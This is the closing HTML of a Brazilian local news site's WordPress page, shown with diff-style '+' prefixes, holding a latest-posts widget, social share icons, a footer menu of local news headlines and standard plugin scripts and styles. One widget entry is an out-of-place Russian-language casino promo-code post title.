+                        <div class="post-img"><a href="https://correiodovale.com.br/2024/12/20/%d0%bf%d1%80%d0%be%d0%bc%d0%be%d0%ba%d0%be%d0%b4%d1%8b-%d0%bf%d0%be%d0%ba%d0%b5%d1%80%d0%b4%d0%be%d0%bc-%d0%b2-2024-%d0%bf%d1%80%d0%b8-%d1%80%d0%b5%d0%b3%d0%b8%d1%81%d1%82%d1%80%d0%b0%d1%86%d0%b8/" title="Промокоды Покердом В 2024 При Регистрации, Пополнении Депозита, Действующие Бонус-коды Для Старых Игроков На Сайте">
+                                                        <img src="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/images/no-image-small.jpg" alt="No image">                            
+                                                    </a></div><!-- .post-img -->
+                        <div class="post-desc-wrapper">
+                            <h4 class="post-title"><a href="https://correiodovale.com.br/2024/12/20/%d0%bf%d1%80%d0%be%d0%bc%d0%be%d0%ba%d0%be%d0%b4%d1%8b-%d0%bf%d0%be%d0%ba%d0%b5%d1%80%d0%b4%d0%be%d0%bc-%d0%b2-2024-%d0%bf%d1%80%d0%b8-%d1%80%d0%b5%d0%b3%d0%b8%d1%81%d1%82%d1%80%d0%b0%d1%86%d0%b8/">Промокоды Покердом В 2024 При Регистрации, Пополнении Депозита, Действующие Бонус-коды Для Старых Игроков На Сайте</a></h4>
+                            <div class="block-poston"><span class="posted-on"><a href="https://correiodovale.com.br/2024/12/20/%d0%bf%d1%80%d0%be%d0%bc%d0%be%d0%ba%d0%be%d0%b4%d1%8b-%d0%bf%d0%be%d0%ba%d0%b5%d1%80%d0%b4%d0%be%d0%bc-%d0%b2-2024-%d0%bf%d1%80%d0%b8-%d1%80%d0%b5%d0%b3%d0%b8%d1%81%d1%82%d1%80%d0%b0%d1%86%d0%b8/" rel="bookmark"><time class="entry-date published updated" datetime="2024-12-20T21:12:35+00:00">Dezembro 20, 2024</time></a></span></div>
+                        </div><!-- .post-desc-wrapper -->
+                    </div><!-- .latest-single-post -->
+                            </div><!-- .latest-posts-wrapper -->
+        </div><!-- .latest-posts clearfix -->
+        </aside><aside id="media_image-3" class="widget widget_media_image"><h4 class="widget-title"><span>SEJA VISTO</span></h4><a href="https://www.lojamacedo.com.br/vedapo-o-melhor-impermeabilizante-do-brasil-cx-10-kg"><img width="502" height="502" src="https://correiodovale.com.br/wp-content/uploads/2021/03/ANUNCIE-AQUI-LADO-DIREITO.jpg" class="image wp-image-439  attachment-full size-full" alt="" style="max-width: 100%; height: auto;" decoding="async" loading="lazy" srcset="https://correiodovale.com.br/wp-content/uploads/2021/03/ANUNCIE-AQUI-LADO-DIREITO.jpg 502w, https://correiodovale.com.br/wp-content/uploads/2021/03/ANUNCIE-AQUI-LADO-DIREITO-300x300.jpg 300w, https://correiodovale.com.br/wp-content/uploads/2021/03/ANUNCIE-AQUI-LADO-DIREITO-150x150.jpg 150w, https://correiodovale.com.br/wp-content/uploads/2021/03/ANUNCIE-AQUI-LADO-DIREITO-100x100.jpg 100w" sizes="auto, (max-width: 502px) 100vw, 502px"></a></aside>	</div>
+</div><!-- #secondary --></div>
+
+</div><!-- #content -->
+
+    <footer id="colophon" class="site-footer" role="contentinfo">    
+        			<div class="top-footer footer-column4">
+    			<div class="apmag-container">
+                    <div class="footer-block-wrapper clearfix">
+        				                            <div class="footer-block-1 footer-block wow fadeInLeft" data-wow-delay="0.5s">        					
+            						<aside id="text-1" class="widget widget_text"><h4 class="widget-title"><span>SOBRE</span></h4>			<div class="textwidget"><p>Bem vindos ao Jornal Correio do Vale do Itajai</p>
+<p><code></code></p>
+</div>
+		</aside>        					
+            				</div>
+                                
+        				        
+        				                        
+                                                    <div class="footer-block-4 footer-block wow fadeInLeft" data-wow-delay="1.2s" style="display: block;">
+        					   <aside id="sfsi-widget-4" class="widget sfsi"><h4 class="widget-title"><span>Ajude a manter divulgando</span></h4>		<div class="sfsi_widget" data-position="widget" style="display:flex;flex-wrap:wrap;justify-content: left">
+			<div id="sfsi_wDiv"></div>
+			<div class="norm_row sfsi_wDiv " style="width:225px;position:absolute;;text-align:left"><div style="width:40px; height:40px;margin-left:5px;margin-bottom:30px; " class="sfsi_wicons shuffeldiv "><div class="inerCnt"><a class=" sficn" data-effect="" target="_blank" rel="noopener" href="https://www.facebook.com/correiodovaledoitajai" id="sfsiid_facebook_icon" style="width:40px;height:40px;opacity:1;"><img data-pin-nopin="true" alt="Facebook" title="Facebook" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/default/default_facebook.png" width="40" height="40" style="" class="sfcm sfsi_wicon " data-effect=""></a><span class="bot_no ">21k</span><div class="sfsi_tool_tip_2 fb_tool_bdr sfsiTlleft" style="opacity:0;z-index:-1;" id="sfsiid_facebook"><span class="bot_arow bot_fb_arow"></span><div class="sfsi_inside"><div class="icon3"><a target="_blank" rel="noopener" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcorreiodovale.com.br%2F2024%2F03%2F02%2Fcasos-de-dengue-em-gestantes-aumentam-345-em-2024" style="display:inline-block;"> <img class="sfsi_wicon" data-pin-nopin="true" alt="fb-share-icon" title="Facebook Share" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/share_icons/fb_icons/pt_PT.svg"></a></div></div></div></div></div><div style="width:40px; height:40px;margin-left:5px;margin-bottom:30px; " class="sfsi_wicons shuffeldiv "><div class="inerCnt"><a class=" sficn" data-effect="" target="_blank" rel="noopener" href="https://twitter.com/CorreiodoItajai" id="sfsiid_twitter_icon" style="width:40px;height:40px;opacity:1;"><img data-pin-nopin="true" alt="Twitter" title="Twitter" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/default/default_twitter.png" width="40" height="40" style="" class="sfcm sfsi_wicon " data-effect=""></a><div class="sfsi_tool_tip_2 twt_tool_bdr sfsiTlleft" style="opacity:0;z-index:-1;" id="sfsiid_twitter"><span class="bot_arow bot_twt_arow"></span><div class="sfsi_inside"><div class="cstmicon1"><a href="https://twitter.com/CorreiodoItajai" target="_blank" rel="noopener"><img data-pin-nopin="true" class="sfsi_wicon" alt="Visit Us" title="Visit Us" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/visit_icons/Visit_us_twitter/icon_Visit_us_pt_PT.png"></a></div><div class="icon1"><a target="_blank" href="https://twitter.com/intent/user?screen_name=CorreiodoItajai">
+			<img data-pin-nopin="true" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/share_icons/Twitter_Follow/pt_PT_Follow.svg" class="sfsi_wicon" alt="Follow Me" title="Follow Me" style="opacity: 1;">
+			</a></div><div class="icon2"><div class="sf_twiter" style="display: inline-block;vertical-align: middle;width: auto;">
+						<a target="_blank" rel="noopener" href="https://twitter.com/intent/tweet?text=Oi+achei+essa+mat%C3%A9ria+bem+legal%2C+veja%3A+https%3A%2F%2Fcorreiodovale.com.br%2F2024%2F03%2F02%2Fcasos-de-dengue-em-gestantes-aumentam-345-em-2024" style="display:inline-block">
+							<img data-pin-nopin="true" class="sfsi_wicon" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/share_icons/Twitter_Tweet/pt_PT_Tweet.svg" alt="Post on X" title="Post on X">
+						</a>
+					</div></div></div></div></div></div><div style="width:40px; height:40px;margin-left:5px;margin-bottom:30px; " class="sfsi_wicons shuffeldiv "><div class="inerCnt"><a class=" sficn" data-effect="" target="_blank" rel="noopener" href="https://www.youtube.com/channel/UCdP7hxstHuJFGBTPm-OWRqA" id="sfsiid_youtube_icon" style="width:40px;height:40px;opacity:1;"><img data-pin-nopin="true" alt="" title="" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/default/default_youtube.png" width="40" height="40" style="" class="sfcm sfsi_wicon " data-effect=""></a></div></div><div style="width:40px; height:40px;margin-left:5px;margin-bottom:30px; " class="sfsi_wicons shuffeldiv "><div class="inerCnt"><a class=" sficn" data-effect="" target="_blank" rel="noopener" href="https://www.instagram.com/correiodovale_" id="sfsiid_instagram_icon" style="width:40px;height:40px;opacity:1;"><img data-pin-nopin="true" alt="" title="" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/default/default_instagram.png" width="40" height="40" style="" class="sfcm sfsi_wicon " data-effect=""></a><span class="bot_no ">2k</span></div></div><div style="width:40px; height:40px;margin-left:5px;margin-bottom:30px; " class="sfsi_wicons shuffeldiv "><div class="inerCnt"><a class=" sficn" data-effect="" target="_blank" rel="noopener" href="https://api.whatsapp.com/send?text=https%3A%2F%2Fcorreiodovale.com.br%2F2024%2F12%2F20%2F%25d0%25bf%25d1%2580%25d0%25be%25d0%25bc%25d0%25be%25d0%25ba%25d0%25be%25d0%25b4%25d1%258b-%25d0%25bf%25d0%25be%25d0%25ba%25d0%25b5%25d1%2580%25d0%25b4%25d0%25be%25d0%25bc-%25d0%25b2-2024-%25d0%25bf%25d1%2580%25d0%25b8-%25d1%2580%25d0%25b5%25d0%25b3%25d0%25b8%25d1%2581%25d1%2582%25d1%2580%25d0%25b0%25d1%2586%25d0%25b8%2F" id="sfsiid_whatsapp_icon" style="width:40px;height:40px;opacity:1;"><img data-pin-nopin="true" alt="" title="" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/default/default_whatsapp.png" width="40" height="40" style="" class="sfcm sfsi_wicon " data-effect=""></a></div></div></div><div id="sfsi_holder" class="sfsi_holders" style="position: relative; float: left;width:100%;z-index:-1;"></div><script>window.addEventListener("sfsi_functions_loaded", function()
+			{
+				if (typeof sfsi_widget_set == "function") {
+					sfsi_widget_set();
+				}
+			}); </script>			<div style="clear: both;"></div>
+		</div>
+	</aside>        					</div>
+                                            </div> <!-- footer-block-wrapper -->
+                 </div><!--apmag-container-->
+            </div><!--top-footer-->
+                	         
+                <div class="bottom-footer clearfix">
+            <div class="apmag-container">            
+        		<div class="site-info">
+                    © 2010 JORNAL CORREIO DO VALE DO ITAJAI         
+        		</div><!-- .site-info -->            
+                <div class="ak-info">
+                            MACEDO SOLUÇÕES INTEGRADAS LTDA  | CNPJ: 41.283.535/0001-02 |                </div>
+                <div class="subfooter-menu">
+                                            <nav id="footer-navigation" class="footer-main-navigation" role="navigation">
+                                <button class="menu-toggle hide" aria-controls="menu" aria-expanded="false">Footer Menu</button>
+                                <div id="apmag-footer-header-menu" class="menu"><ul id="menu-destaques-1" class="menu accesspress_mag_mega_menu"><li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-952"><a href="https://correiodovale.com.br/category/cidades/">CIDADES</a><ul class="sub-menu mega-sub-menu no-mega-cat-menu"><li class="menu-item-inner-mega clearfix"><div class="ap-mega-menu-con-wrap"><div id="cat-con-id-89" class="cat-con-section"><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/15/sequestro-relampago-em-navegantes/" title="Sequestro relâmpago em Navegantes"><img src="https://correiodovale.com.br/wp-content/uploads/2024/04/policia-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2024/10/15/sequestro-relampago-em-navegantes/" title="Sequestro relâmpago em Navegantes">Sequestro relâmpago em Navegantes</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/14/confraternizacao-de-dia-das-criancas-movimenta-o-loteamento-primavera/" title="Confraternização de Dia das Crianças movimenta o Loteamento Primavera"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/dia-das-crianas-bairro-primavera-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2024/10/14/confraternizacao-de-dia-das-criancas-movimenta-o-loteamento-primavera/" title="Confraternização de Dia das Crianças movimenta o Loteamento Primavera">Confraternização de Dia das Crianças movimenta o Loteamento Primavera</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/10/oportunidade-de-trabalho-na-regiao/" title="Oportunidade de trabalho na região"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/trabalho-240x172.png"></a></div><h3><a href="https://correiodovale.com.br/2024/10/10/oportunidade-de-trabalho-na-regiao/" title="Oportunidade de trabalho na região">Oportunidade de trabalho na região</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/09/pesquisa-popular-revela-que-joel-soares-enfrentara-ceticismo-e-desafios-em-seu-primeiro-mandato-como-prefeito-de-ilhota/" title="Pesquisa popular revela que Joel Soares Enfrentará Ceticismo e Desafios em Seu Primeiro Mandato como Prefeito de Ilhota"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/capa-joel-soares-240x172.png"></a></div><h3><a href="https://correiodovale.com.br/2024/10/09/pesquisa-popular-revela-que-joel-soares-enfrentara-ceticismo-e-desafios-em-seu-primeiro-mandato-como-prefeito-de-ilhota/" title="Pesquisa popular revela que Joel Soares Enfrentará Ceticismo e Desafios em Seu Primeiro Mandato como Prefeito de Ilhota">Pesquisa popular revela que Joel Soares Enfrentará Ceticismo e Desafios em Seu Primeiro Mandato como Prefeito de Ilhota</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/08/ilhota-no-podio-dos-campeoes-de-mandato/" title="Ilhota no Pódio dos Campeões de Mandato"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/podio-dos-vereadores-campeoes-240x172.png"></a></div><h3><a href="https://correiodovale.com.br/2024/10/08/ilhota-no-podio-dos-campeoes-de-mandato/" title="Ilhota no Pódio dos Campeões de Mandato">Ilhota no Pódio dos Campeões de Mandato</a></h3></div></div></div></li></ul></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-953"><a href="https://correiodovale.com.br/category/mundo/">MUNDO</a><ul class="sub-menu mega-sub-menu no-mega-cat-menu"><li class="menu-item-inner-mega clearfix"><div class="ap-mega-menu-con-wrap"><div id="cat-con-id-90" class="cat-con-section"><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/04/28/santa-catarina-registra-casos-de-febre-do-oropouche-doenca-do-maruim-pela-primeira-vez-na-historia/" title="Santa Catarina registra casos de febre do Oropouche (doença do Maruim) pela primeira vez na história"><img src="https://correiodovale.com.br/wp-content/uploads/2024/04/maruim-240x172.webp"></a></div><h3><a href="https://correiodovale.com.br/2024/04/28/santa-catarina-registra-casos-de-febre-do-oropouche-doenca-do-maruim-pela-primeira-vez-na-historia/" title="Santa Catarina registra casos de febre do Oropouche (doença do Maruim) pela primeira vez na história">Santa Catarina registra casos de febre do Oropouche (doença do Maruim) pela primeira vez na história</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2023/05/31/especialistas-alertam-para-risco-de-extincao-causado-pela-inteligencia-artificial/" title="Especialistas alertam para risco de extinção causado pela inteligência artificial"><img src="https://correiodovale.com.br/wp-content/uploads/2023/05/inteligencia-artificial_pode_levar_a_extincao-240x172.jpeg"></a></div><h3><a href="https://correiodovale.com.br/2023/05/31/especialistas-alertam-para-risco-de-extincao-causado-pela-inteligencia-artificial/" title="Especialistas alertam para risco de extinção causado pela inteligência artificial">Especialistas alertam para risco de extinção causado pela inteligência artificial</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2023/04/20/primeiro-lancamento-da-nave-starship-pela-spacex-um-passo-gigantesco-rumo-a-exploracao-espacial/" title="Primeiro lançamento da nave Starship pela SpaceX: um passo gigantesco rumo à exploração espacial"><img src="https://correiodovale.com.br/wp-content/uploads/2023/04/Screenshot-2023-04-20-at-12-27-45-GELEIA-DE-PIMENTA-240x172.png"></a></div><h3><a href="https://correiodovale.com.br/2023/04/20/primeiro-lancamento-da-nave-starship-pela-spacex-um-passo-gigantesco-rumo-a-exploracao-espacial/" title="Primeiro lançamento da nave Starship pela SpaceX: um passo gigantesco rumo à exploração espacial">Primeiro lançamento da nave Starship pela SpaceX: um passo gigantesco rumo à exploração espacial</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2022/10/29/seminarios-palestras-apresentacoes-culturais-e-premio-simeao-integram-a-programacao-em-novembro/" title="Seminários, palestras, apresentações culturais e Prêmio Simeão integram a programação em novembro"><img src="https://correiodovale.com.br/wp-content/uploads/2022/10/rasismo-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2022/10/29/seminarios-palestras-apresentacoes-culturais-e-premio-simeao-integram-a-programacao-em-novembro/" title="Seminários, palestras, apresentações culturais e Prêmio Simeão integram a programação em novembro">Seminários, palestras, apresentações culturais e Prêmio Simeão integram a programação em novembro</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2022/04/24/emmanuel-macron-e-reeleito-presidente-da-franca/" title="Emmanuel Macron é reeleito presidente da França"><img src="https://correiodovale.com.br/wp-content/uploads/2022/04/macron-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2022/04/24/emmanuel-macron-e-reeleito-presidente-da-franca/" title="Emmanuel Macron é reeleito presidente da França">Emmanuel Macron é reeleito presidente da França</a></h3></div></div></div></li></ul></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-954"><a href="https://correiodovale.com.br/category/esportes/">ESPORTES</a><ul class="sub-menu mega-sub-menu no-mega-cat-menu"><li class="menu-item-inner-mega clearfix"><div class="ap-mega-menu-con-wrap"><div id="cat-con-id-114" class="cat-con-section"><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/08/28/balneario-camboriu-surf-talentos-oceano-2024/" title="Balneário Camboriú Surf Talentos Oceano 2024"><img src="https://correiodovale.com.br/wp-content/uploads/2024/08/foto-marcio-david-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2024/08/28/balneario-camboriu-surf-talentos-oceano-2024/" title="Balneário Camboriú Surf Talentos Oceano 2024">Balneário Camboriú Surf Talentos Oceano 2024</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/03/25/ihotenses-conquistam-vitoria-no-xcm-no-true/" title="Ihotenses conquistam vitória no XCM no True"><img src="https://correiodovale.com.br/wp-content/uploads/2024/03/leandro_capa-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2024/03/25/ihotenses-conquistam-vitoria-no-xcm-no-true/" title="Ihotenses conquistam vitória no XCM no True">Ihotenses conquistam vitória no XCM no True</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2023/04/10/hegemonias-sao-mantidas-nas-decisoes-estaduais-e-fluminense-garante-bicampeonato-carioca-com-goleada-sobre-flamengo/" title="Hegemonias são mantidas nas decisões estaduais e Fluminense garante bicampeonato carioca com goleada sobre Flamengo"><img src="https://correiodovale.com.br/wp-content/uploads/2023/04/Screenshot-2023-04-10-at-12-11-01-Fluminense-puxa-fila-de-campeoes-que-mantem-soberania-nos-Estaduais-240x172.png"></a></div><h3><a href="https://correiodovale.com.br/2023/04/10/hegemonias-sao-mantidas-nas-decisoes-estaduais-e-fluminense-garante-bicampeonato-carioca-com-goleada-sobre-flamengo/" title="Hegemonias são mantidas nas decisões estaduais e Fluminense garante bicampeonato carioca com goleada sobre Flamengo">Hegemonias são mantidas nas decisões estaduais e Fluminense garante bicampeonato carioca com goleada sobre Flamengo</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2022/04/19/1122/" title="Copa Brasil: Flu recebe Vila Nova"><img src="https://correiodovale.com.br/wp-content/uploads/2022/04/maracana_fluminense_estadio-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2022/04/19/1122/" title="Copa Brasil: Flu recebe Vila Nova">Copa Brasil: Flu recebe Vila Nova</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2022/04/07/de-8-milhoes-para-novo-ginasio-em-ilhota/" title="+ de 8 milhões para novo Ginásio em Ilhota"><img src="https://correiodovale.com.br/wp-content/uploads/2022/04/novo-ginasio-ilhota-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2022/04/07/de-8-milhoes-para-novo-ginasio-em-ilhota/" title="+ de 8 milhões para novo Ginásio em Ilhota">+ de 8 milhões para novo Ginásio em Ilhota</a></h3></div></div></div></li></ul></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-955"><a href="https://correiodovale.com.br/category/politica/">POLITICA</a><ul class="sub-menu mega-sub-menu no-mega-cat-menu"><li class="menu-item-inner-mega clearfix"><div class="ap-mega-menu-con-wrap"><div id="cat-con-id-91" class="cat-con-section"><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/09/pesquisa-popular-revela-que-joel-soares-enfrentara-ceticismo-e-desafios-em-seu-primeiro-mandato-como-prefeito-de-ilhota/" title="Pesquisa popular revela que Joel Soares Enfrentará Ceticismo e Desafios em Seu Primeiro Mandato como Prefeito de Ilhota"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/capa-joel-soares-240x172.png"></a></div><h3><a href="https://correiodovale.com.br/2024/10/09/pesquisa-popular-revela-que-joel-soares-enfrentara-ceticismo-e-desafios-em-seu-primeiro-mandato-como-prefeito-de-ilhota/" title="Pesquisa popular revela que Joel Soares Enfrentará Ceticismo e Desafios em Seu Primeiro Mandato como Prefeito de Ilhota">Pesquisa popular revela que Joel Soares Enfrentará Ceticismo e Desafios em Seu Primeiro Mandato como Prefeito de Ilhota</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/08/ilhota-no-podio-dos-campeoes-de-mandato/" title="Ilhota no Pódio dos Campeões de Mandato"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/podio-dos-vereadores-campeoes-240x172.png"></a></div><h3><a href="https://correiodovale.com.br/2024/10/08/ilhota-no-podio-dos-campeoes-de-mandato/" title="Ilhota no Pódio dos Campeões de Mandato">Ilhota no Pódio dos Campeões de Mandato</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/08/camara-de-ilhota-e-a-extincao-da-tribuna-livre-a-voz-do-povo-continuara-silenciada/" title="Câmara de Ilhota e a Extinção da Tribuna Livre: A Voz do Povo Continuará Silenciada?"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/tribuna-livre-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2024/10/08/camara-de-ilhota-e-a-extincao-da-tribuna-livre-a-voz-do-povo-continuara-silenciada/" title="Câmara de Ilhota e a Extinção da Tribuna Livre: A Voz do Povo Continuará Silenciada?">Câmara de Ilhota e a Extinção da Tribuna Livre: A Voz do Povo Continuará Silenciada?</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/07/eleicoes-2024-vereadores-eleitos-em-ilhota/" title="Eleições 2024: Vereadores eleitos em Ilhota"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/vereadores-ilhota-240x172.png"></a></div><h3><a href="https://correiodovale.com.br/2024/10/07/eleicoes-2024-vereadores-eleitos-em-ilhota/" title="Eleições 2024: Vereadores eleitos em Ilhota">Eleições 2024: Vereadores eleitos em Ilhota</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/07/a-ascensao-cautelosa-de-joel-soares-a-prefeitura-de-ilhota/" title="Joel Soares: Prefeito ou Marionete? O Desafio de Sair da Sombra do Poder"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/resultado-eleicoes-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2024/10/07/a-ascensao-cautelosa-de-joel-soares-a-prefeitura-de-ilhota/" title="Joel Soares: Prefeito ou Marionete? O Desafio de Sair da Sombra do Poder">Joel Soares: Prefeito ou Marionete? O Desafio de Sair da Sombra do Poder</a></h3></div></div></div></li></ul></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-5247"><a href="https://correiodovale.com.br/tv-ilhota/">TV</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-5248"><a href="https://correiodovale.com.br/contato">Contato</a></li>
+</ul></div>                        </nav><!-- #site-navigation -->
+                                    </div>             
+            </div>
+        </div><!-- .bottom-footer -->
+        	</footer><!-- #colophon -->
+    <div id="back-top">
+        <a href="#top"><i class="fa fa-arrow-up"></i> <span> HOME </span></a>
+    </div>   
+</div><!-- #page -->
+                <!--facebook like and share js -->
+                <div id="fb-root"></div>
+                <script>
+                    (function(d, s, id) {
+                        var js, fjs = d.getElementsByTagName(s)[0];
+                        if (d.getElementById(id)) return;
+                        js = d.createElement(s);
+                        js.id = id;
+                        js.src = "//connect.facebook.net/pt_PT/sdk.js#xfbml=1&version=v2.5";
+                        fjs.parentNode.insertBefore(js, fjs);
+                    }(document, 'script', 'facebook-jssdk'));
+                </script>
+                <script>
+window.addEventListener('sfsi_functions_loaded', function() {
+    if (typeof sfsi_plugin_version == 'function') {
+        sfsi_plugin_version(2.77);
+    }
+});
+
+function sfsi_processfurther(ref) {
+    var feed_id = 'QWwxVFNmc3R4UmNPUUsveDJVVUFCWWdVcFB4UERneTZWYmQxL3RaYlZ2aWhJWkxTblFod2lPcHpaUDk3Mng4YTk2Ny9aWk55VmhLM2VoMjRJRUpYL205dnhWQlkvL0RyNFZSWUN6QkpoRExwRU9zanZZUXZqdUphL3NBVEtqZWV8UWt4dVI0NW5ZcEdZOC9GYi9VL0JPMEtWRktLcnNrRDZWQmNad2dydEpUZz0=';
+    var feedtype = 8;
+    var email = jQuery(ref).find('input[name="email"]').val();
+    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+    if ((email != "Enter your email") && (filter.test(email))) {
+        if (feedtype == "8") {
+            var url = "https://api.follow.it/subscription-form/" + feed_id + "/" + feedtype;
+            window.open(url, "popupwindow", "scrollbars=yes,width=1080,height=760");
+            return true;
+        }
+    } else {
+        alert("Please enter email address");
+        jQuery(ref).find('input[name="email"]').focus();
+        return false;
+    }
+}
+</script>
+<style type="text/css" aria-selected="true">
+.sfsi_subscribe_Popinner {
+    width: 100% !important;
+
+    height: auto !important;
+
+    
+    padding: 18px 0px !important;
+
+    background-color: #ffffff !important;
+}
+
+.sfsi_subscribe_Popinner form {
+    margin: 0 20px !important;
+}
+
+.sfsi_subscribe_Popinner h5 {
+    font-family: Helvetica,Arial,sans-serif !important;
+
+    font-weight: bold !important;
+                color: #000000 !important;    
+        font-size: 16px !important;    
+        text-align: center !important;        margin: 0 0 10px !important;
+    padding: 0 !important;
+}
+
+.sfsi_subscription_form_field {
+    margin: 5px 0 !important;
+    width: 100% !important;
+    display: inline-flex;
+    display: -webkit-inline-flex;
+}
+
+.sfsi_subscription_form_field input {
+    width: 100% !important;
+    padding: 10px 0px !important;
+}
+
+.sfsi_subscribe_Popinner input[type=email] {
+        font-family: Helvetica,Arial,sans-serif !important;    
+    font-style: normal !important;
+        
+        font-size: 14px !important;    
+        text-align: center !important;    }
+
+.sfsi_subscribe_Popinner input[type=email]::-webkit-input-placeholder {
+
+        font-family: Helvetica,Arial,sans-serif !important;    
+    font-style: normal !important;
+           
+        font-size: 14px !important;    
+        text-align: center !important;    }
+
+.sfsi_subscribe_Popinner input[type=email]:-moz-placeholder {
+    /* Firefox 18- */
+        font-family: Helvetica,Arial,sans-serif !important;    
+    font-style: normal !important;
+        
+        font-size: 14px !important;    
+        text-align: center !important;    
+}
+
+.sfsi_subscribe_Popinner input[type=email]::-moz-placeholder {
+    /* Firefox 19+ */
+        font-family: Helvetica,Arial,sans-serif !important;    
+        font-style: normal !important;
+        
+            font-size: 14px !important;                text-align: center !important;    }
+
+.sfsi_subscribe_Popinner input[type=email]:-ms-input-placeholder {
+
+    font-family: Helvetica,Arial,sans-serif !important;
+    font-style: normal !important;
+        
+            font-size: 14px !important ;
+            text-align: center !important;    }
+
+.sfsi_subscribe_Popinner input[type=submit] {
+
+        font-family: Helvetica,Arial,sans-serif !important;    
+    font-weight: bold !important;
+            color: #000000 !important;    
+        font-size: 16px !important;    
+        text-align: center !important;    
+        background-color: #dedede !important;    }
+
+.sfsi_shortcode_container {
+        float: left;
+    }
+
+    .sfsi_shortcode_container .norm_row .sfsi_wDiv {
+        position: relative !important;
+    }
+
+    .sfsi_shortcode_container .sfsi_holders {
+        display: none;
+    }
+
+    </style>
+
+<link rel="stylesheet" id="mediaelement-css" href="https://correiodovale.com.br/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css?ver=4.2.17" type="text/css" media="all">
+<link rel="stylesheet" id="wp-mediaelement-css" href="https://correiodovale.com.br/wp-includes/js/mediaelement/wp-mediaelement.min.css?ver=6.7.1" type="text/css" media="all">
+<style id="core-block-supports-inline-css" type="text/css">
+.wp-container-core-columns-is-layout-1{flex-wrap:nowrap;}
+</style>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-content/plugins/t4b-news-ticker/assets/js/jquery.liscroll.js?ver=1.2.9" id="liscroll-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3" id="jquery-ui-core-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/js/shuffle/modernizr.custom.min.js?ver=6.7.1" id="SFSIjqueryModernizr-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/js/shuffle/jquery.shuffle.min.js?ver=6.7.1" id="SFSIjqueryShuffle-js"></script>
